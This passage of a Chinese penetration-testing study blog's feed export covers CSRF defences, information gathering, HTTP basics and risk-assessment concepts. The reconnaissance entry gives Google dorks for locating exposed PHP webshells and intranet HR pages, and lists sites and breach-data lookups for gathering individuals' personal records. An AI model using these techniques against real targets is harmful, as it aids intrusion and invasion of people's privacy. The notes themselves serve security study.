src="https://img-blog.csdnimg.cn/20200708224552996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x03-漏洞检测"><a href="#0x03-漏洞检测" class="headerlink" title="0x03 漏洞检测"></a>0x03 漏洞检测</h1><p>自动检测：AWVS扫描器<br>半自动检测：CSRFTester</p><h1 id="0x04-漏洞防御"><a href="#0x04-漏洞防御" class="headerlink" title="0x04 漏洞防御"></a>0x04 漏洞防御</h1><p>1、验证HTTP Referer字段<br>2、Token验证<br>3、添加验证码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x00-CSRF原理概要&quot;&gt;&lt;a href=&quot;#0x00-CSRF原理概要&quot; class=&quot;headerlink&quot; title=&quot;0x00 CSRF原理概要&quot;&gt;&lt;/a&gt;0x00 CSRF原理概要&lt;/h1&gt;&lt;h2 id=&quot;1-概念&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="学习笔记" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="CSRF" scheme="https://s40d1.github.io/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>第二节 信息收集</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E8%8A%82%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E8%8A%82%20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-07-07T14:10:37.000Z</published>
    <updated>2020-07-07T14:03:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00信息收集的概念"><a href="#0x00信息收集的概念" class="headerlink" title="0x00信息收集的概念"></a>0x00信息收集的概念</h1><p>黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标的所有探测活动。</p><h1 id="0x01信息收集的作用"><a href="#0x01信息收集的作用" class="headerlink" title="0x01信息收集的作用"></a>0x01信息收集的作用</h1><ol><li>了解安全架构：信息收集使攻击者能够了解组织完整的安全架构</li><li>缩小攻击范围：通过IP地址范围、网络、域名、远程访问点等信息，可以缩小攻击范围</li><li>建立信息数据库：攻击者能够建立他们自己的相关目标组织安全性弱点的信息数据库来采取下一步的入侵行动</li><li>描绘网络拓扑：攻击者可以描绘出目标组织的网络拓扑图，分析最容易进入的攻击路径</li></ol><p>*<em>信息收集对于渗透来说是非常重要的一步，收集的信息越详细对以后渗透测试的影响越大，毫不夸张的说，信息的收集决定着渗透的成功与否<br>*</em></p><h1 id="0x02信息收集的分类"><a href="#0x02信息收集的分类" class="headerlink" title="0x02信息收集的分类"></a>0x02信息收集的分类</h1><ul><li><strong>被动信息收集</strong>：被动信息收集也就是说不会与目标服务器做直接的交互、在不被目标系统察觉的情况下，通过搜索引擎、社交媒体等方式对目标外围的信息进行收集，例如：网站的whois信息、DNS信息、管理员以及工作人员的个人信息等等。</li><li><strong>主动信息收集</strong>：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息。例如：主机开发的端口、站点的目录结构等等。</li></ul><h1 id="0x03信息收集的内容"><a href="#0x03信息收集的内容" class="headerlink" title="0x03信息收集的内容"></a>0x03信息收集的内容</h1><table><thead><tr><th>网络信息</th><th>系统信息</th><th>组织信息</th></tr></thead><tbody><tr><td>域名</td><td>用户和用户组名</td><td>员工信息</td></tr><tr><td>内网域名</td><td>系统标示banner</td><td>组织网站</td></tr><tr><td>网段</td><td>路由表</td><td>公司地址</td></tr><tr><td>授权可访问的IP地址</td><td>SNMP信息</td><td>信息详情</td></tr><tr><td>内部网站</td><td>系统架构</td><td>地址和电话号码</td></tr><tr><td>开放的TCP/UDP端口</td><td>远程系统类型</td><td>邮箱地址</td></tr><tr><td>访问控制机制和ACL</td><td>系统用户名</td><td>HTML代码中的注释</td></tr><tr><td>运行的网络协议</td><td>密码</td><td>实行的安全策略</td></tr><tr><td>VPN接入点</td><td>站点目录</td><td>与组织相关的WEB服务</td></tr><tr><td>访问控制策略</td><td>测试/临时文件</td><td>组织的背景</td></tr><tr><td>运行的IDS监听策略</td><td></td><td>发布的新闻</td></tr><tr><td>模拟、数字电话号码</td><td></td><td></td></tr><tr><td>认证机制</td><td></td><td></td></tr><tr><td>系统评估措施</td><td></td><td></td></tr><tr><td>防火墙等安全设施</td><td></td><td></td></tr></tbody></table><h1 id="0x04信息收集的方法"><a href="#0x04信息收集的方法" class="headerlink" title="0x04信息收集的方法"></a>0x04信息收集的方法</h1><p>方法概览：搜索引擎，网站，邮件，竞争情报，Google，whois，DNS，网络信息收集，社会工程学，社交网站。</p><h2 id="地理位置"><a href="#地理位置" class="headerlink" title="地理位置"></a>地理位置</h2><p>使用在线地图寻找<br><img src="https://img-blog.csdnimg.cn/20200707201126493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="查询个人信息"><a href="#查询个人信息" class="headerlink" title="查询个人信息"></a>查询个人信息</h2><h3 id="网站查询"><a href="#网站查询" class="headerlink" title="网站查询"></a>网站查询</h3><ul><li>公积金：<a href="http://www.bjgjj.gov.cn/" target="_blank" rel="external nofollow noopener noreferrer">http://www.bjgjj.gov.cn/</a></li><li>社保四险：<a href="http://www.bjld.gov.cn/csibiz/home/index.html" target="_blank" rel="external nofollow noopener noreferrer">http://www.bjld.gov.cn/csibiz/home/index.html</a></li><li>驾驶证信息：<a href="http://www.bjjtgl.gov.cn/publish/portal0/" target="_blank" rel="external nofollow noopener noreferrer">http://www.bjjtgl.gov.cn/publish/portal0/</a></li><li>工作居住证：<a href="http://210.73.77.4/uamsso/" target="_blank" rel="external nofollow noopener noreferrer">http://210.73.77.4/uamsso/</a></li><li>电子学历：<a href="http://www.chsi.com.cn/xlcx/" target="_blank" rel="external nofollow noopener noreferrer">http://www.chsi.com.cn/xlcx/</a></li><li>信用卡记录：各银行信用卡网站申请进度查询</li><li>公交一卡通查询：<a href="http://www.bmac.com.cn/" target="_blank" rel="external nofollow noopener noreferrer">http://www.bmac.com.cn/</a><h3 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h3><img src="https://img-blog.csdnimg.cn/20200707201518888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h3 id="社工库查询"><a href="#社工库查询" class="headerlink" title="社工库查询"></a>社工库查询</h3><img src="https://img-blog.csdnimg.cn/20200707202152691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><h3 id="目标网站可能提供"><a href="#目标网站可能提供" class="headerlink" title="目标网站可能提供"></a>目标网站可能提供</h3></li><li>使用的软件及版本</li><li>使用的操作系统</li><li>子目录及参数</li><li>文件名、路径、数据库字段名及查询语句</li><li>脚本平台</li><li>通讯信息和内容管理系统详情<h3 id="使用Burp-Suite-Firebug等工具来浏览头部能够提供的信息："><a href="#使用Burp-Suite-Firebug等工具来浏览头部能够提供的信息：" class="headerlink" title="使用Burp Suite , Firebug等工具来浏览头部能够提供的信息："></a>使用Burp Suite , Firebug等工具来浏览头部能够提供的信息：</h3></li><li>连接状态和内容种类</li><li>接收范围</li><li>最后编辑信息</li><li>X-Powered-By信息</li><li>使用的Web服务及版本信息</li></ul><h3 id="核查HTML源码可获得："><a href="#核查HTML源码可获得：" class="headerlink" title="核查HTML源码可获得："></a>核查HTML源码可获得：</h3><ul><li>代码中的注释</li><li>web开发或管理员的联系详情</li><li>文件系统架构</li><li>脚本类型</li></ul><h3 id="核查Cookies可获得："><a href="#核查Cookies可获得：" class="headerlink" title="核查Cookies可获得："></a>核查Cookies可获得：</h3><p>使用的软件和它的使用习惯信息<br>使用的脚本平台</p><h3 id="邮件信息"><a href="#邮件信息" class="headerlink" title="邮件信息"></a>邮件信息</h3><p><img src="https://img-blog.csdnimg.cn/202007072032379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Google-hacking"><a href="#Google-hacking" class="headerlink" title="Google hacking"></a>Google hacking</h3><ul><li>Site 指定域名</li><li>Intext 正文中存在关键字的网页</li><li>Intitle 标题中存在关键字的网页</li><li>Info 一些基本信息</li><li>Inurl url存在关键字的网页</li><li>Filetype 搜索指定文件类型</li></ul><p>例如：“intitle:管理登录 filetype:php” 查询页面标题含有“管理登录”，并且为php类型的网站。<br><img src="https://img-blog.csdnimg.cn/20200707203715668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="查找利用php-webshell"><a href="#查找利用php-webshell" class="headerlink" title="查找利用php webshell"></a>查找利用php webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:&quot;php shell*&quot; &quot;Enable stderr&quot; filetype:php</span><br></pre></td></tr></table></figure><p>intitle—网页标题<br>Enable stderr—UNIX标准输出和标准错误的缩写<br>filetype—文件类型 </p><h4 id="访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息"><a href="#访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息" class="headerlink" title="访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息"></a>访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intitle:intranet inurl:intranet+intext:”human resources”</span><br></pre></td></tr></table></figure><h3 id="shodan搜索引擎"><a href="#shodan搜索引擎" class="headerlink" title="shodan搜索引擎"></a>shodan搜索引擎</h3><p>Shoudan是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机，工控系统等）的搜索引擎。它在圈子里就像google一样出名。它主要拦截从服务器到客户端的元数据来工作，目前提供超过50个端口的相关搜索。</p><p><img src="https://img-blog.csdnimg.cn/20200707210911347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="shodan能找到的设备"><a href="#shodan能找到的设备" class="headerlink" title="shodan能找到的设备"></a>shodan能找到的设备</h4><p>服务器<br>路由器<br>交换机<br>公共ip打印机<br>网络摄像头<br>加油站的泵<br>Voip电话和所有数据采集监控系统</p><h4 id="shodan能做的"><a href="#shodan能做的" class="headerlink" title="shodan能做的"></a>shodan能做的</h4><p>用户搜索定制项目<br>寻找端口并拦截数据<br>拦截的数据设置索引<br>显示结果</p><h4 id="shodan网站信息收集"><a href="#shodan网站信息收集" class="headerlink" title="shodan网站信息收集"></a>shodan网站信息收集</h4><p><img src="https://img-blog.csdnimg.cn/20200707212322858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="Google和Shodan的区别"><a href="#Google和Shodan的区别" class="headerlink" title="Google和Shodan的区别"></a>Google和Shodan的区别</h4><p>Google的爬虫/蜘蛛 抓取网页数据并为网页内容创建索引。Shoudan主要寻找端口并抓取拦截到的信息，然后为它们建立索引，最后显示结果。<br>Shoudan并不像google那样为网页内容建立索引，因此它是一个基于拦截器的搜索引擎。</p><h2 id="whois信息收集"><a href="#whois信息收集" class="headerlink" title="whois信息收集"></a>whois信息收集</h2><h3 id="Whois可以获取的信息"><a href="#Whois可以获取的信息" class="headerlink" title="Whois可以获取的信息"></a>Whois可以获取的信息</h3><p><img src="https://img-blog.csdnimg.cn/2020070721330186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="通过Whois信息可以？"><a href="#通过Whois信息可以？" class="headerlink" title="通过Whois信息可以？"></a>通过Whois信息可以？</h3><p><img src="https://img-blog.csdnimg.cn/20200707213327706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200707214029837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h2><p><img src="https://img-blog.csdnimg.cn/20200707214459287.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200707214550451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00信息收集的概念&quot;&gt;&lt;a href=&quot;#0x00信息收集的概念&quot; class=&quot;headerlink&quot; title=&quot;0x00信息收集的概念&quot;&gt;&lt;/a&gt;0x00信息收集的概念&lt;/h1&gt;&lt;p&gt;黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标的所有探测活动
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="学习笔记" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="渗透测试;信息收集" scheme="https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>第一节 HTTP请求流程</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%80%E8%8A%82%20HTTP%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%B8%80%E8%8A%82%20HTTP%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B/</id>
    <published>2020-07-07T11:17:37.000Z</published>
    <updated>2020-07-07T11:11:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-HTTP协议分析"><a href="#0x01-HTTP协议分析" class="headerlink" title="0x01 HTTP协议分析"></a>0x01 HTTP协议分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">客户端-&gt;&gt;服务器: 1、request</span><br><span class="line">服务器-&gt;&gt;客户端: 2、response</span><br></pre></td></tr></table></figure><h1 id="0x02-HTTP请求与响应"><a href="#0x02-HTTP请求与响应" class="headerlink" title="0x02 HTTP请求与响应"></a>0x02 HTTP请求与响应</h1><h2 id="1-请求"><a href="#1-请求" class="headerlink" title="1.请求"></a>1.请求</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;test.php HTTP&#x2F;1.1                            &#x2F;&#x2F;请求行</span><br><span class="line">HOST：www.test.com                                 &#x2F;&#x2F;请求头</span><br><span class="line">User-Agent：Mozilla&#x2F;5.0 （windows NT 6.1；rv：15.0）Gecko&#x2F;20100101 Firefox&#x2F;15.0</span><br><span class="line">                                                   &#x2F;&#x2F;空白行，代表请求头结束</span><br><span class="line">Username&#x3D;admin&amp;password&#x3D;admin                     &#x2F;&#x2F;请求正文</span><br></pre></td></tr></table></figure><h2 id="2-响应"><a href="#2-响应" class="headerlink" title="2.响应"></a>2.响应</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK                                    &#x2F;&#x2F;响应行</span><br><span class="line">Date: Sun, 15 Nov 2015 11:02:04 GMT               &#x2F;&#x2F;响应头</span><br><span class="line">Server: bfe&#x2F;1.0.8.9</span><br><span class="line">Content-Length: 2605</span><br><span class="line">Content-Type: application&#x2F;javascript</span><br><span class="line">Cache-Control: max-age&#x3D;315360000</span><br><span class="line">Expires: Fri, 13 Jun 2025 09:54:00 GMT</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Set-Cookie: H_PS_PSSID&#x3D;2022_1438_1944_1788; path&#x3D;&#x2F;; domain&#x3D;test.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">                                                 &#x2F;&#x2F;空白行，代表响应头结束</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt; Index.html &lt;&#x2F;title&gt;&lt;&#x2F;head&gt;           &#x2F;&#x2F;响应正文或者叫消息主题</span><br></pre></td></tr></table></figure><h1 id="0x03-HTTP请求方法"><a href="#0x03-HTTP请求方法" class="headerlink" title="0x03 HTTP请求方法"></a>0x03 HTTP请求方法</h1><ul><li><strong>GET</strong>：GET方法用于获取请求页面的指定信息。如果请求资源为动态脚本（非HTML），那么返回文本是Web容器解析后的HTML源代码。GET请求没有消息主体，因此在消息头后的空白行是没有其他数据。</li><li><strong>POST</strong>：POST方法也与GET方法相似，但最大的区别在于，GET方法没有请求内容，而POST是有请求内容的。</li><li><strong>HEAD</strong>：这个请求的功能与GET请求相似，不同之处在于服务器不会再其响应中返回消息主体，因此，这种方法可用于检查某一资源在向其提交GET请求前是否存在。</li><li><strong>PUT</strong>：PUT方法用于请求服务器把请求中的实体存储在请求资源下，如果请求资源已经在服务器中存在，那么将会用此请求中的数据替换原先的数据。向服务器上传指定的资源。</li></ul><h1 id="0x04-HTTP状态码"><a href="#0x04-HTTP状态码" class="headerlink" title="0x04 HTTP状态码"></a>0x04 HTTP状态码</h1><ul><li>1xx：信息提示，表示请求已被成功接收，继续处理。</li><li>2xx：请求被成功提交。</li><li>3xx：客户端被重定向到其他资源。</li><li>4xx：客户端错误状态码，格式错误或者不存在资源。</li><li>5xx：描述服务器内部错误。</li></ul><p>常见的状态码描述如下：</p><ul><li>200：客户端请求成功，是最常见的状态。</li><li>302：重定向。</li><li>404：请求资源不存在，是最常见的状态。</li><li>400：客户端请求有语法错误，不能被服务器所理解。</li><li>401：请求未经授权。</li><li>403：服务器收到请求，但是拒绝提供服务。</li><li>500：服务器内部错误，是最常见的状态。</li><li>503：服务器当前不能处理客户端的请求。</li></ul><h1 id="0x05-HTTP消息头"><a href="#0x05-HTTP消息头" class="headerlink" title="0x05 HTTP消息头"></a>0x05 HTTP消息头</h1><h2 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h2><ul><li>Host 请求报头域主要用于指定被请求资源的Internet主机和端口。</li><li>User-Agent 请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。</li><li>Referer 包含一个URL，代表当前访问URL的上一个URL，也就是说，用户是从什么地方来到本页面。当前请求的原始URL地址。</li><li>Cookie 是非常重要的请求头，常用来表示请求者的身份等。</li><li>Accept 这个消息头用于告诉服务器客户端愿意接受那些内容，比如图像类，办公文档格式等等。<blockquote><p>可直接在浏览器中利用的输入点：请求行，请求正文<br>黑客在实际利用中的输入点：请求行，referer，user-agent，cookie，请求正文</p></blockquote></li></ul><h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><ul><li>Server 服务器使用的Web服务器名称。</li><li>Location 服务器通过这个头告诉浏览器去访问哪个页面，浏览器接收到这个请求之后，通常会立刻访问Location头所指向的页面。用于在重定向响应中说明重定向的目标地址。</li><li>Content-Type 这个消息头用于规定主体的内容类型。例如，HTML文档的内容类型text/html。</li><li>Content-Encoding 这个消息头为消息主体中的内容指定编码形式，一些应用程序使用它来压缩响应以加快传输速度。</li><li>Content-Length 消息头规定消息主体的字节长度。实体头用于指明实体正文的长度，以字节方式存储的十进制数字来表示。</li><li>Connection 允许发送指定连接的选项。</li></ul><h1 id="0x06-拦截HTTP请求"><a href="#0x06-拦截HTTP请求" class="headerlink" title="0x06 拦截HTTP请求"></a>0x06 拦截HTTP请求</h1><ul><li>Fiddler</li><li>Burp Suite</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-HTTP协议分析&quot;&gt;&lt;a href=&quot;#0x01-HTTP协议分析&quot; class=&quot;headerlink&quot; title=&quot;0x01 HTTP协议分析&quot;&gt;&lt;/a&gt;0x01 HTTP协议分析&lt;/h1&gt;&lt;figure class=&quot;highlight plai
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="学习笔记" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="渗透测试 HTTP协议" scheme="https://s40d1.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTP%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>风险评估相关概念</title>
    <link href="https://s40d1.github.io/wiki/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/"/>
    <id>https://s40d1.github.io/wiki/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/</id>
    <published>2020-06-25T16:13:37.000Z</published>
    <updated>2020-06-27T07:15:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-风险的起源"><a href="#0x00-风险的起源" class="headerlink" title="0x00 风险的起源"></a>0x00 风险的起源</h1><p>“风险”一次来源已久。最普通的说法是：以打鱼为生的渔民们，每次出行前都要祈祷，祈求神灵保佑自己平安归来。其中祈祷的主要内容就是让神灵保佑自己在出海时候能够风平浪静、满载而归；域名们在长期的捕捞实践中，深深的体会到“风”给他们带来的无法预测和无法确定的危险，在出海打渔的过程中的，“风”即意味着显“险”，“风险”一词因此而得来。</p><h1 id="0x01-风险的定义"><a href="#0x01-风险的定义" class="headerlink" title="0x01 风险的定义"></a>0x01 风险的定义</h1><p>在信息安全，<strong>风险（risk）</strong>就是指各种<strong>威胁</strong>导致<strong>安全事件</strong>发生的<strong>可能性</strong>及其对组织所造成的负面<strong>影响</strong>。</p><h1 id="0x02-风险的特性"><a href="#0x02-风险的特性" class="headerlink" title="0x02 风险的特性"></a>0x02 风险的特性</h1><ol><li><strong>客观性</strong>：不以人的意志为转移的客观存在。</li><li><strong>必然性</strong>：伴随着事物发展不可避免。</li><li><strong>社会性</strong>：后果对社会的影响很大。（如：天灾人祸）</li><li><strong>普遍性</strong>：存在于事物之中，贯穿于整个生命的周期。</li><li><strong>相对性</strong>：因时空等元素变化而变化。</li><li><strong>时效性</strong>：风险随着时间的推移而产生变化。</li><li><strong>不确定性</strong>：发生时间、损失、是否发生都不确定。</li><li><strong>损失性</strong>：风险事件存在，就有造成损失的可能性。</li><li><strong>可识别性</strong>：通过分析事物的内外因素，可识别风险。</li><li><strong>可控性</strong>：采取一定的控制措施，可以把风险损失控制在一定的范围内。<br>其中8、9、10可以解释为什么要研究风险。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-风险的起源&quot;&gt;&lt;a href=&quot;#0x00-风险的起源&quot; class=&quot;headerlink&quot; title=&quot;0x00 风险的起源&quot;&gt;&lt;/a&gt;0x00 风险的起源&lt;/h1&gt;&lt;p&gt;“风险”一次来源已久。最普通的说法是：以打鱼为生的渔民们，每次出行前都要祈祷
      
    
    </summary>
    
    
      <category term="安全服务" scheme="https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/"/>
    
      <category term="风险评估" scheme="https://s40d1.github.io/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"/>
    
    
      <category term="风险评估 概念" scheme="https://s40d1.github.io/tags/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0-%E6%A6%82%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>article title</title>
    <link href="https://s40d1.github.io/wiki/CTF/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
    <id>https://s40d1.github.io/wiki/CTF/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</id>
    <published>2020-06-23T16:13:37.000Z</published>
    <updated>2020-06-23T16:15:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一篇文章"><a href="#第一篇文章" class="headerlink" title="第一篇文章"></a>第一篇文章</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一篇文章&quot;&gt;&lt;a href=&quot;#第一篇文章&quot; class=&quot;headerlink&quot; title=&quot;第一篇文章&quot;&gt;&lt;/a&gt;第一篇文章&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://s40d1.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>article title</title>
    <link href="https://s40d1.github.io/wiki/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
    <id>https://s40d1.github.io/wiki/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</id>
    <published>2020-06-23T16:13:37.000Z</published>
    <updated>2020-06-23T16:15:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一篇文章"><a href="#第一篇文章" class="headerlink" title="第一篇文章"></a>第一篇文章</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第一篇文章&quot;&gt;&lt;a href=&quot;#第一篇文章&quot; class=&quot;headerlink&quot; title=&quot;第一篇文章&quot;&gt;&lt;/a&gt;第一篇文章&lt;/h1&gt;
      
    
    </summary>
    
    
